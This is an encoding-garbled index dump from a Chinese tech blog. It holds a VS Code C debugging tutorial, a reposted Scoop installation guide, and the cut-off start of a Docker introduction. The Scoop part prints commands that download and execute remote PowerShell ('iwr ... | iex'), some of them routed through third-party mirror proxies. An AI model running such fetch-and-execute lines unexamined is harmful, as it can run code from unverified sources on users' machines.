ä¸ºäº†æ–¹ä¾¿ç®¡ç†ä»£ç ï¼Œæˆ‘ä»¬å…ˆé€‰ä¸­Cæ–‡ä»¶å¤¹ï¼Œå†ç‚¹å‡»æ–°å»ºæ–‡ä»¶å¤¹æŒ‰é’®ã€‚\næ­¤æ—¶ä¼šåœ¨Cæ–‡ä»¶å¤¹çš„ä¸‹çº§å‡ºç°ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œæˆ‘ä»¬æ–°å»ºä¸€ä¸ªåä¸ºtestçš„æ–‡ä»¶å¤¹ã€‚\né¼ æ ‡å³é”®testæ–‡ä»¶å¤¹ï¼Œåœ¨å¼¹å‡ºçš„èœå•ä¸­é€‰æ‹©æ–°å»ºæ–‡ä»¶ã€‚ åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æˆ‘ä»¬æ¥ä¸‹æ¥è¦è¿›è¡Œè°ƒè¯•ä»£ç æ–‡ä»¶åï¼Œå‘½åä¸ºtest.cï¼Œæ³¨æ„ï¼Œä¸€å®šè¦æ˜¯ .c ç»“å°¾ã€‚\næ¥ä¸‹æ¥å°±å¯ä»¥è¾“å…¥ä¸€ä¸ªè°ƒè¯•ç¨‹åºäº†ï¼Œæˆ‘çš„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main() { for (int i = 0; i \u0026lt; 5; i++) printf(\u0026#34;Hello Ranch~%d\\n\u0026#34;, i); return 0; } å†™å¥½æµ‹è¯•ä»£ç åï¼Œç‚¹å‡»å³ä¸Šè§’çš„è°ƒè¯•æŒ‰é’®ï¼Œè¿™æ—¶ä¼šå¼¹å‡ºè°ƒè¯•ç¨‹åºçš„é€‰é¡¹ï¼Œé€‰æ‹©ç¬¬ä¸€ä¸ªï¼Œä¹Ÿæ˜¯æœ¬æ•™ç¨‹å‰é¢å®‰è£…çš„ gcc ç¼–è¯‘å·¥å…·ã€‚\nå¦‚æœè¦è¿›è¡Œç®€å•çš„æ–­ç‚¹è°ƒè¯•ï¼Œå¯ä»¥åœ¨è¡Œå·å‰åŠ ä¸€ä¸ªæ–­ç‚¹ï¼Œæ“ä½œä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€ç”¨é¼ æ ‡å·¦é”®ç‚¹ä¸€ä¸‹è¡Œå·å·¦è¾¹çš„ç©ºç™½å¤„å³å¯ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ˜¯åœ¨ç¬¬å…­è¡Œå¤„åŠ äº†ä¸€ä¸ªæ–­ç‚¹ã€‚\nè¿™æ—¶å†å»è¿è¡Œç¨‹åºï¼Œæœç´¢æ¡†ä¸‹é¢å°±ä¼šå‡ºç°è°ƒè¯•çš„é¢æ¿ï¼Œé¢æ¿ä¸Šæœ‰å…­ä¸ªæŒ‰é’®ï¼Œåˆ†åˆ«æ˜¯ç»§ç»­ã€é€è¿‡ç¨‹ã€å•æ­¥è°ƒè¯•ã€å•æ­¥è·³å‡ºã€é‡å¯å’Œåœæ­¢ã€‚\n[!IMPORTANT]\nä»¥ä¸‹æ˜¯ VS Code ä¸­çš„ C è¯­è¨€ä»£ç è°ƒè¯•é¢æ¿åŠŸèƒ½çš„è§£é‡Šï¼š\nç»§ç»­ï¼ˆContinueï¼‰ï¼šç»§ç»­æ‰§è¡Œç¨‹åºï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹æˆ–ç¨‹åºç»“æŸã€‚\né€è¿‡ç¨‹ï¼ˆStep Overï¼‰ï¼šé€è¡Œæ‰§è¡Œå½“å‰è¡Œï¼Œå¦‚æœå½“å‰è¡Œæ˜¯å‡½æ•°è°ƒç”¨ï¼Œåˆ™è¿›å…¥è¯¥å‡½æ•°å¹¶æ‰§è¡Œå®Œæ¯•ã€‚\nå•æ­¥è°ƒè¯•ï¼ˆStep Intoï¼‰ï¼šé€è¡Œæ‰§è¡Œå½“å‰è¡Œï¼Œå¦‚æœå½“å‰è¡Œæ˜¯å‡½æ•°è°ƒç”¨ï¼Œåˆ™è¿›å…¥è¯¥å‡½æ•°å¹¶åœåœ¨å‡½æ•°å†…çš„ç¬¬ä¸€è¡Œã€‚\nå•æ­¥è·³å‡ºï¼ˆStep Outï¼‰ï¼šæ‰§è¡Œå®Œå½“å‰å‡½æ•°çš„å‰©ä½™éƒ¨åˆ†ï¼Œå¹¶åœåœ¨å½“å‰å‡½æ•°è¢«è°ƒç”¨çš„ä¸‹ä¸€è¡Œã€‚\né‡å¯ï¼ˆRestartï¼‰ï¼šé‡æ–°å¯åŠ¨ç¨‹åºçš„è°ƒè¯•ä¼šè¯ï¼Œå³ä»ç¨‹åºçš„èµ·ç‚¹å¼€å§‹æ‰§è¡Œã€‚\nåœæ­¢ï¼ˆStopï¼‰ï¼šåœæ­¢ç¨‹åºçš„è°ƒè¯•ä¼šè¯ï¼Œç»“æŸè°ƒè¯•è¿‡ç¨‹å¹¶å…³é—­ç¨‹åºæ‰§è¡Œã€‚\nå¤šä¸ª .c æ–‡ä»¶çš„è¿è¡Œä¸æµ‹è¯• å¦‚æœæƒ³è¦è¿›è¡Œå¤šä¸ª .c æ–‡ä»¶ç¼–è¯‘åçš„è°ƒè¯•ï¼Œå°±éœ€è¦è¿›è¡Œä¸€äº›é…ç½®ä¿®æ”¹ã€‚å¦‚æœè¿›è¡Œè¿‡ä¸€æ¬¡ç¼–è¯‘è¿è¡Œï¼Œæˆ‘ä»¬ä¼šå‘ç°åœ¨èµ„æºç®¡ç†å™¨çš„Cæ–‡ä»¶å¤¹ä¸‹ï¼Œå¤šå‡ºä¸€ä¸ª.vscodeçš„æ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹é‡Œé¢æœ‰ä¸ªtasks.jsonçš„æ–‡ä»¶\nè¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨äºå®šä¹‰ä»»åŠ¡é…ç½®ï¼Œè¿™äº›ä»»åŠ¡å¯ä»¥åœ¨ VS Code ä¸­è¿è¡Œï¼Œä¾‹å¦‚ç¼–è¯‘ä»£ç ã€è¿è¡Œæµ‹è¯•ã€å¯åŠ¨è°ƒè¯•å™¨ç­‰ã€‚\ntasks.jsonæ–‡ä»¶æ˜¯ä¸€ä¸ª JSON æ ¼å¼çš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†ä»»åŠ¡çš„é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä»»åŠ¡åç§°ã€å‘½ä»¤ã€å‚æ•°ç­‰ã€‚é€šè¿‡ç¼–è¾‘tasks.jsonæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰é¡¹ç›®ä¸­çš„å„ç§ä»»åŠ¡ï¼Œå¹¶åœ¨ VS Code ä¸­æ–¹ä¾¿åœ°æ‰§è¡Œè¿™äº›ä»»åŠ¡ã€‚\nå½“å‰çš„ VS Code çš„è¿è¡Œæ•ˆæœè¿˜ä¸æ˜¯å¾ˆç†æƒ³ï¼ŒåŒå‡»æ‰“å¼€tasks.jsonæ–‡ä»¶ä¿®æ”¹ä¸€ä¸‹ç¼–è¯‘è¿è¡ŒåŠŸèƒ½ã€‚ä¸‹å›¾æ˜¯å¯¹è¯¥ JSON æ–‡ä»¶åšäº†éƒ¨åˆ†è§£é‡Šã€‚\nå…·ä½“ä¿®æ”¹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘æ³¨é‡Šæ‰äº†åŸæ¥çš„${file}ï¼Œå¹¶æ–°å¢ä¸€è¡Œ*.cï¼Œè¡¨ç¤ºå¹¶éæŒ‡å®šæŸä¸€ä¸ª .c æ–‡ä»¶ï¼Œè€Œæ˜¯å½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰çš„.cæ–‡ä»¶ã€‚\nåŒæ—¶ä¹ŸæŠŠ${fileDirname}\\\\${fileBasenameNoExtension}.exeæ³¨é‡Šæ‰ï¼Œæ”¹æˆ${fileDirname}\\\\program.exeï¼Œé‚£ä¹ˆå¤šä¸ª .c æ–‡ä»¶ç¼–è¯‘ä¹‹åçš„å¯æ‰§è¡Œæ–‡ä»¶å°±æ˜¯program.exeã€‚\nç„¶åç‚¹å‡»å·¦ä¾§çš„è¿è¡Œä¸è°ƒè¯•ï¼Œå†ç‚¹å‡»åˆ›å»ºlaunch.jsonæ–‡ä»¶ã€‚\nç„¶å VS Code ä¼šæ–°å»ºä¸€ä¸ª JSON æ–‡ä»¶ï¼Œç‚¹å‡»å³ä¸‹è§’çš„æ·»åŠ é…ç½®ï¼Œåœ¨å¼¹å‡ºçš„ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©C/C++ï¼šï¼ˆgdbï¼‰å¯åŠ¨ã€‚\nä¿®æ”¹ä¸ºä¸‹å›¾çº¢æ¡†æ‰€ç¤ºå†…å®¹ï¼Œâ€œprogramâ€åçš„å†…å®¹å°±æ˜¯å‰é¢æåˆ°çš„tasks.jsonæ–‡ä»¶ä¸­çš„ç¼–è¯‘åäº§ç”Ÿçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚\u0026quot;miDebuggerPath\u0026quot;åé¢çš„åˆ™æ˜¯å‰é¢å®‰è£…çš„ MinGW-W64 çš„ gdb å·¥å…·çš„è·¯å¾„ã€‚ä¿®æ”¹åä¿æŒå…³é—­ã€‚\né™„å½• å‚è€ƒæ–‡çŒ® ã€ŠVS Code é…ç½® C/C++ ç¼–ç¨‹è¿è¡Œç¯å¢ƒï¼ˆä¿å§†çº§æ•™ç¨‹ï¼‰ã€‹\nç‰ˆæƒä¿¡æ¯ æœ¬æ–‡åŸè½½äº Ranch\u0026rsquo;s Blogï¼Œéµå¾ª CC BY-NC-SA 4.0 åè®®ï¼Œå¤åˆ¶è¯·ä¿ç•™åŸæ–‡å‡ºå¤„ã€‚\n","date":"2024-11-09T20:27:17+08:00","image":"http://ranch007.github.io/p/vs-code-%E9%85%8D%E7%BD%AE-c-c-%E7%BC%96%E7%A8%8B%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/c\u0026c++_hu17170354815735081465.png","permalink":"http://ranch007.github.io/p/vs-code-%E9%85%8D%E7%BD%AE-c-c-%E7%BC%96%E7%A8%8B%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/","title":"VS Code é…ç½® C \u0026 C++ ç¼–ç¨‹è¿è¡Œç¯å¢ƒ"},{"content":" è½¬è½½è‡ªã€ŠWindows ä¸‹åŒ…ç®¡ç†å™¨ Scoop çš„å®‰è£…ä¸ä½¿ç”¨ - Muxiner\u0026rsquo;s Blogã€‹\nğŸ‰ ä»€ä¹ˆæ˜¯ Scoop ï¼Ÿ ğŸ˜¶â€ğŸŒ«ï¸ å¯ä»¥å»çœ‹ã€Scoop Github ä¸Šçš„ä»‹ç»ã€‘ã€‚\nğŸ˜¶â€ğŸŒ«ï¸ è¿˜æœ‰å®˜æ–¹æ–‡æ¡£ã€Scoop Wikiã€‘w\nğŸ˜¶â€ğŸŒ«ï¸ å®˜ç½‘ã€https://scoop.sh/ã€‘\nScoop æ˜¯ Windows ä¸Šçš„å‘½ä»¤è¡Œå®‰è£…å·¥å…·ã€‚\nğŸ™ˆ å¯ä»¥ç”¨æ¥å¹²å˜›ï¼Ÿ\nğŸ¦¥ é€šè¿‡å‘½ä»¤è¡Œç•Œé¢ï¼ŒScoop å¯ä»¥é¡ºç•…åœ°å®‰è£…åº”ç”¨ç¨‹åºã€‚ï¼ˆå®˜æ–¹è¯´æ˜ï¼‰\nğŸŒ² æ²¡æœ‰æƒé™å¼¹å‡ºçª—å£ ğŸŒ² éšè— GUI å‘å¯¼å¼å®‰è£…ç¨‹åº ğŸŒ² é˜²æ­¢å› è€Œå®‰è£…å¤§é‡ç¨‹åºé€ æˆ PATH æ±¡æŸ“ ğŸŒ² é¿å…å®‰è£…å’Œå¸è½½ç¨‹åºçš„ä¸å½“ä½¿ç”¨ ğŸŒ² è‡ªåŠ¨æŸ¥æ‰¾å¹¶å®‰è£…ä¾èµ–é¡¹ ğŸŒ² è‡ªåŠ¨æ‰§è¡Œæ‰€æœ‰é¢å¤–çš„è®¾ç½®æ­¥éª¤æ¥è·å–å·¥ä½œç¨‹åº ğŸ‰ å®‰è£… Scoop ğŸŠ å‡†å¤‡å·¥ä½œ PowerShell ï¼š ç¡®ä¿å·²å®‰è£… PowerShell 5.0 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚\nWindows 10 ä»¥åŠæ›´é«˜çš„ç‰ˆæœ¬é»˜è®¤å®‰è£…çš„ PowerShell 5.0ã€‚\nç¡®ä¿ä»¥å…è®¸ Powershell æ‰§è¡Œæœ¬åœ°è„šæœ¬ã€‚\n1 set-executionpolicy remotesigned -scope currentuser Unrestricted ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯å®‰å…¨æ€§è¾ƒä½ã€‚\næœ€å¥½ä½¿ç”¨ RemoteSignedã€‚\nğŸ‘ å®‰è£…åœ¨é»˜è®¤ä½ç½® é»˜è®¤å®‰è£…åœ¨ C:\\Users\\username\\scoop è·¯å¾„ä¸‹ã€‚\næ‰§è¡Œå‘½ä»¤ï¼š\n1 Invoke-Expression (New-Object System.Net.WebClient).DownloadString(\u0026#39;https://get.scoop.sh\u0026#39;) æˆ–æ˜¯æ‰§è¡Œï¼ˆæ›´çŸ­çš„ï¼‰ï¼š\n1 iwr -useb get.scoop.sh | iex 2022.11.17 æ›´æ–°ï¼š\nä¸ºåŠ å¿« Scoop çš„å®‰è£…é€Ÿåº¦ï¼Œä¸»è¦æ˜¯ä¸‹è½½é€Ÿåº¦ï¼Œä½¿ç”¨ä»£ç†è¿›è¡ŒåŠ é€Ÿä¸‹è½½ã€‚\nfastgit ä¸‹è½½\nè¿›å…¥ç”¨æˆ·ä¸»ç›®å½•ï¼šcd ~\nä¸‹è½½ scoop_install.ps1ï¼š\n1 curl -o scoop_install.ps1 https://raw.fastgit.org/scoopinstaller/install/master/install.ps1 ä¿®æ”¹ scoop_install.ps1 ä¸­æ–‡ä»¶ä¸‹è½½åœ°å€ï¼š\n1 (Get-Content scoop_install.ps1).replace(\u0026#39;https://github.com/ScoopInstaller/\u0026#39;, \u0026#39;https://download.fastgit.org//ScoopInstaller/\u0026#39;) | Set-Content scoop_install.ps1 å®‰è£… Scoopï¼š./scoop_install.ps1\nåˆ é™¤ scoop_install.ps1ï¼šrm scoop_install.ps1\ngithub proxy ä¸‹è½½\nè¿›å…¥ç”¨æˆ·ä¸»ç›®å½•ï¼šcd ~\nä¸‹è½½ scoop_install.ps1ï¼š\n1 curl -o scoop_install.ps1 https://ghproxy.com/https://raw.githubusercontent.com/scoopinstaller/install/master/install.ps1 ä¿®æ”¹ scoop_install.ps1 ä¸­æ–‡ä»¶ä¸‹è½½åœ°å€ï¼š\n1 (Get-Content scoop_install.ps1).replace(\u0026#39;https://github.com/ScoopInstaller/\u0026#39;, \u0026#39;https://ghproxy.com/https://github.com/ScoopInstaller/\u0026#39;) | Set-Content scoop_install.ps1 å®‰è£… Scoopï¼š./scoop_install.ps1\nåˆ é™¤ scoop_install.ps1ï¼šrm scoop_install.ps1\nğŸ‘ è‡ªå®šä¹‰å®‰è£…ç›®å½•\nä¾‹å¦‚å°† Scoop å®‰è£…åœ¨ C:\\Scoop è·¯å¾„ä¸‹ã€‚\néœ€è¦æ·»åŠ è¯¥è·¯å¾„åˆ°ç”¨æˆ·å˜é‡ä¸­ï¼š\n1 $env:SCOOP=\u0026#39;C:\\scoop\u0026#39; 1 [environment]::setEnvironmentVariable(\u0026#39;SCOOP\u0026#39;,$env:SCOOP,\u0026#39;User\u0026#39;) å½“ç„¶ä¹Ÿå¯ä»¥æ·»åŠ åˆ°ç³»ç»Ÿå˜é‡ä¸­ï¼š\nä¸è¿‡æ­¤æ—¶éœ€è¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ PowerShell ï¼Œæˆ–æ˜¯ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ Windows Terminalï¼Œå†æ‰“å¼€ PowerShell ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š\n1 [environment]::setEnvironmentVariable(\u0026#39;SCOOP\u0026#39;,$env:SCOOP,\u0026#39;Machine\u0026#39;) æ·»åŠ å®Œç¯å¢ƒå˜é‡åéœ€è¦é‡å¯ PowerShell æˆ– Terminal ç­‰å¾…å˜é‡ç”Ÿæ•ˆã€‚\nç„¶åå†æ‰§è¡Œå®‰è£…æŒ‡ä»¤ï¼š\n1 iwr -useb get.scoop.sh | iex å®‰è£…æ–¹å¼åŒä¸Šï¼Œç‚¹æ­¤è·³è½¬åˆ°æ–°çš„å®‰è£…æ–¹å¼\nğŸ‘ è‡ªå®šä¹‰å…¨å±€åº”ç”¨å®‰è£…ç›®å½• ä¾‹å¦‚è‡ªå®šä¹‰å°†å…¨å±€åº”ç”¨å®‰è£…åœ¨ C:\\apps è·¯å¾„ä¸‹ï¼š\nå°±éœ€è¦å°†è¯¥ç›®å½•æ·»åŠ åˆ°ç³»ç»Ÿå˜é‡ä¸­ï¼Œæ­¥éª¤åŒä¸Šæ–‡ç›¸åŒï¼š\nğŸ˜¶â€ğŸŒ«ï¸ ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ ğŸ˜¶â€ğŸŒ«ï¸ $env:SCOOP_GLOBAL='C:\\apps' ğŸ˜¶â€ğŸŒ«ï¸ [environment]::setEnvironmentVariable('SCOOP_GLOBAL',$env:SCOOP_GLOBAL,'Machine') ğŸ˜¶â€ğŸŒ«ï¸ å®‰è£…æŒ‡ä»¤ï¼šscoop install -g \u0026lt;app\u0026gt; åˆèµ·æ¥å°±æ˜¯ï¼š\n1 2 3 $env:SCOOP_GLOBAL=\u0026#39;C:\\apps\u0026#39; [environment]::setEnvironmentVariable(\u0026#39;SCOOP_GLOBAL\u0026#39;,$env:SCOOP_GLOBAL,\u0026#39;Machine\u0026#39;) scoop install -g \u0026lt;app\u0026gt; ğŸ‰ ä½¿ç”¨ Scoop æŸ¥çœ‹ scoop çš„å‘½ä»¤ï¼š\n1 scoop help æŸ¥çœ‹å‘½ä»¤çš„è¯¦ç»†ä¿¡æ¯ï¼š\n1 2 3 scoop help \u0026lt;command\u0026gt; # for example: scoop help install # For more detailed information on INSTALL æ‰§è¡Œ scoop help install ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Usage: scoop install \u0026lt;app\u0026gt; [options] e.g. The usual way to install an app (uses your local \u0026#39;buckets\u0026#39;): scoop install git To install an app from a manifest at a URL: scoop install https://raw.githubusercontent.com/ScoopInstaller/Main/master/bucket/runat.json To install an app from a manifest on your computer scoop install \\path\\to\\app.json Options: -g, --global Install the app globally -i, --independent Don\u0026#39;t install dependencies automatically -k, --no-cache Don\u0026#39;t use the download cache -u, --no-update-scoop Don\u0026#39;t update Scoop before installing if it\u0026#39;s outdated -s, --skip Skip hash validation (use with caution!) -a, --arch \u0026lt;32bit|64bit\u0026gt; Use the specified architecture, if the app supports it ğŸ’ å®‰è£…åº”ç”¨ åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š\nğŸ˜ƒä¸ºå½“å‰ç”¨æˆ·å®‰è£… å®‰è£…è·¯å¾„ï¼šscoop\\apps\nscoop è·¯å¾„é»˜è®¤åœ¨ C:\\User\\username ã€‚\nè‹¥æ˜¯è‡ªå®šä¹‰å®‰è£…è·¯å¾„ï¼Œä¾‹å¦‚ä¸Šæ–‡çš„ä½ç½®ï¼Œåˆ™åœ¨ C:\\Scoop\nå®‰è£…å‘½ä»¤ï¼š\n1 2 3 scoop install \u0026lt;app\u0026gt; # for example: # scoop install nano ğŸ˜ƒä¸ºæ‰€æœ‰ç”¨æˆ·å®‰è£… é»˜è®¤çš„å®‰è£…è·¯å¾„ï¼šC:\\ProgramData\\scoop\nè‹¥æ˜¯å¦‚ä¸Šæ–‡æ‰€ç¤ºï¼Œè‡ªå®šä¹‰äº†å…¨å±€åº”ç”¨å®‰è£…ç›®å½•ï¼Œåˆ™å®‰è£…è·¯å¾„ï¼šC:\\apps\néœ€è¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œã€‚\nå®‰è£…å‘½ä»¤ï¼š\n1 2 3 scoop install \u0026lt;app\u0026gt; -g # for example: # scoop install nano -g ğŸ’ å¸è½½åº”ç”¨ ğŸ˜ƒå¸è½½æŸä¸€ç¨‹åº 1 scoop uninstall \u0026lt;app\u0026gt; ğŸ˜ƒå¸è½½ç¨‹åºå¹¶ç§»é™¤é…ç½®æ–‡ä»¶ 1 scoop uninstall \u0026lt;app\u0026gt; -p ğŸ˜ƒå¸è½½å…¨å±€ç¨‹åº\n1 scoop uninstall \u0026lt;app\u0026gt; -g ğŸ˜ƒæ›´å¤šä¿¡æ¯\n1 scoop help uninstall ğŸ’ æ›´æ–° ğŸ˜ƒæ›´æ–° scoop åŠæ‰€æœ‰ bucket ä½†ä¸æ›´æ–° app 1 scoop update ğŸ˜ƒæ›´æ–°æŸä¸€ app 1 scoop update \u0026lt;app\u0026gt; ğŸ˜ƒæ›´æ–° scoopã€bucketã€app 1 scoop update * ğŸ˜ƒæ›´æ–°å…¨å±€ app 1 scoop update \u0026lt;app\u0026gt; -g ğŸ˜ƒæ›´å¤šä¿¡æ¯ 1 scoop help update ğŸ’ å…¶ä»–æœ‰ç”¨æ“ä½œ ğŸ˜ƒæŸ¥çœ‹å·²å®‰è£… app 1 scoop list ğŸ˜ƒæŸ¥çœ‹å¯æ›´æ–° app 1 scoop status ğŸ˜ƒæŸ¥çœ‹æŸ app ä¸»é¡µ 1 scoop home \u0026lt;app\u0026gt; ğŸ˜ƒæŸ¥çœ‹ã€Œå·²çŸ¥åº“ã€ 1 scoop bucket known ğŸ˜ƒæ·»åŠ ã€Œå·²çŸ¥åº“ã€ 1 scoop bucket add \u0026lt;bucket\u0026gt; ğŸ˜ƒæŸ¥çœ‹å·²æ·»åŠ çš„åº“ 1 scoop bucket list ğŸ˜ƒåˆ é™¤å·²æ·»åŠ çš„åº“ 1 scoop bucket rm \u0026lt;bucket\u0026gt; ğŸ˜ƒæ·»åŠ ç¬¬ä¸‰æ–¹åº“ 1 scoop bucket add \u0026lt;bucket\u0026gt; \u0026lt;bucket_url\u0026gt; ğŸ˜ƒåˆ é™¤å·²å®‰è£…è½¯ä»¶çš„æ—§ç‰ˆæœ¬ 1 scoop cleanup * ğŸ˜ƒæ¸…ç†è½¯ä»¶ç¼“å­˜ é€šå¸¸æ˜¯ä¸‹è½½çš„è½¯ä»¶å®‰è£…åŒ…ã€‚\nä»¥ä¸‹å‘½ä»¤æ¸…é™¤æ‰€æœ‰ç¼“å­˜ï¼Œå³æ¸…ç©º Scoop ç›®å½•ä¸‹çš„ cache æ–‡ä»¶å¤¹ã€‚\n1 scoop cache rm * ğŸ‰ è¿›é˜¶ æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ã€å®˜æ–¹æ–‡æ¡£ã€‘ã€‚\né™„å½• å‚è€ƒæ–‡çŒ® è½¬è½½è‡ªã€ŠWindows ä¸‹åŒ…ç®¡ç†å™¨ Scoop çš„å®‰è£…ä¸ä½¿ç”¨ - Muxiner\u0026rsquo;s Blogã€‹\nç‰ˆæƒä¿¡æ¯ æœ¬æ–‡åŸè½½äº Muxiner\u0026rsquo;s Blogï¼Œéµå¾ª CC BY-NC-SA 4.0 åè®®ï¼Œå¤åˆ¶è¯·ä¿ç•™åŸæ–‡å‡ºå¤„ã€‚\n","date":"2024-11-09T20:12:54+08:00","image":"http://ranch007.github.io/p/%E8%BD%AC%E8%BD%BDwindows-%E4%B8%8B%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8-scoop-%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/scoop_hu16592925861197910045.png","permalink":"http://ranch007.github.io/p/%E8%BD%AC%E8%BD%BDwindows-%E4%B8%8B%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8-scoop-%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","title":"ã€è½¬è½½ã€‘Windows ä¸‹åŒ…ç®¡ç†å™¨ Scoop çš„å®‰è£…ä¸ä½¿ç”¨"},{"content":" å‰è¨€ ä»€ä¹ˆæ˜¯ Docker ï¼Ÿ å®¹å™¨å·¥ä½œçš„åŸç† å®¹å™¨çš„æ¶æ„ DockeråŒ…æ‹¬ä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µï¼š\né•œåƒï¼ˆImageï¼‰ï¼šDocker é•œåƒï¼ˆImageï¼‰ï¼Œå°±ç›¸å½“äºæ˜¯ä¸€ä¸ª root æ–‡ä»¶ç³»ç»Ÿã€‚æ¯”å¦‚å®˜æ–¹é•œåƒ ubuntu:16.04 å°±åŒ…å«äº†å®Œæ•´çš„ä¸€å¥— Ubuntu16.04 æœ€å°ç³»ç»Ÿçš„ root æ–‡ä»¶ç³»ç»Ÿã€‚ å®¹å™¨ï¼ˆContainerï¼‰ï¼šé•œåƒï¼ˆImageï¼‰å’Œå®¹å™¨ï¼ˆContainerï¼‰çš„å…³ç³»ï¼Œå°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ç±»å’Œå®ä¾‹ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œå®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚å®¹å™¨å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰ã€‚ ä»“åº“ï¼ˆRepositoryï¼‰ï¼šä»“åº“å¯çœ‹æˆä¸€ä¸ªä»£ç æ§åˆ¶ä¸­å¿ƒï¼Œç”¨æ¥ä¿å­˜é•œåƒã€‚ Docker çš„ä¼˜åŠ¿ ä¸ºä½•ä½¿ç”¨ Docker ï¼Ÿ Docker æ”¯æŒå¼€å‘äººå‘˜ä½¿ç”¨ç®€å•çš„å‘½ä»¤è®¿é—®è¿™äº›æœ¬æœºå®¹å™¨åŒ–åŠŸèƒ½ï¼Œå¹¶é€šè¿‡èŠ‚çœå·¥ä½œé‡çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ (API) è‡ªåŠ¨æ‰§è¡Œã€‚ ä¸ LXC ç›¸æ¯”ï¼ŒDocker æä¾›äº†ä»¥ä¸‹åŠŸèƒ½ï¼š\nå¢å¼ºçš„æ— ç¼å®¹å™¨å¯ç§»æ¤æ€§ï¼šè™½ç„¶ LXC å®¹å™¨é€šå¸¸å¼•ç”¨ç‰¹å®šäºæœºå™¨çš„é…ç½®ï¼Œä½† Docker å®¹å™¨æ— éœ€ä¿®æ”¹å³å¯åœ¨ä»»ä½•æ¡Œé¢ã€æ•°æ®ä¸­å¿ƒå’Œäº‘ç¯å¢ƒä¸­è¿è¡Œã€‚ æ›´è½»å·§ä¸”æ›´ç»†ç²’åº¦çš„æ›´æ–°ï¼šé€šè¿‡ä½¿ç”¨ LXCï¼Œå¯ä»¥åœ¨å•ä¸ªå®¹å™¨ä¸­ç»„åˆå¤šä¸ªè¿›ç¨‹ã€‚ è¿™æ ·å°±å¯ä»¥æ„å»ºæŒç»­è¿è¡Œçš„åº”ç”¨ï¼Œå³ä½¿ä¸ºäº†æ›´æ–°æˆ–ä¿®å¤è€Œå…³é—­æŸä¸ªéƒ¨åˆ†ä¹Ÿä¸ä¾‹å¤–ã€‚ è‡ªåŠ¨åŒ–å®¹å™¨åˆ›å»ºï¼šDocker å¯ä»¥åŸºäºåº”ç”¨æºä»£ç è‡ªåŠ¨æ„å»ºå®¹å™¨ã€‚ å®¹å™¨ç‰ˆæœ¬æ§åˆ¶ï¼šDocker å¯ä»¥è·Ÿè¸ªå®¹å™¨æ˜ åƒçš„ç‰ˆæœ¬ï¼Œå›æ»šåˆ°å…ˆå‰çš„ç‰ˆæœ¬ï¼Œä»¥åŠè·Ÿè¸ªç‰ˆæœ¬çš„æ„å»ºè€…å’Œæ„å»ºæ–¹å¼ã€‚ å®ƒç”šè‡³å¯ä»¥åªä¸Šä¼ ç°æœ‰ç‰ˆæœ¬å’Œæ–°ç‰ˆæœ¬ä¹‹é—´çš„å¢é‡ã€‚ å®¹å™¨å¤ç”¨ï¼šç°æœ‰å®¹å™¨å¯ç”¨ä½œåŸºæœ¬æ˜ åƒï¼ˆæœ¬è´¨ä¸Šç±»ä¼¼äºç”¨äºæ„å»ºæ–°å®¹å™¨çš„æ¨¡æ¿ï¼‰ã€‚ å…±äº«å®¹å™¨åº“ï¼šå¼€å‘äººå‘˜å¯ä»¥è®¿é—®åŒ…å«æ•°åƒä¸ªç”¨æˆ·è´¡çŒ®å®¹å™¨çš„å¼€æºæ³¨å†Œè¡¨ã€‚ åœ¨åˆæ­¥è®¤è¯†äº†è§£äº†Dockeråï¼Œä¸‹é¢æ­£å¼è¿›å…¥Dockerå®‰è£…ç¯èŠ‚ï¼\nå®‰è£… è¿›å…¥Dockerå®˜ç½‘ é¦–å…ˆå…ˆåˆ°Dockerå®˜ç½‘ä¸‹è½½æœ€æ–°å®˜æ–¹Docker for Windowsé“¾æ¥ï¼šã€ä¸‹è½½Dockerã€‘\nå¯åŠ¨ Microsoft Hyper-V åœ¨ç”µè„‘ä¸Šæ‰“å¼€â€œæ§åˆ¶é¢æ¿â€-\u0026gt;â€œç¨‹åºâ€-\u0026gt; 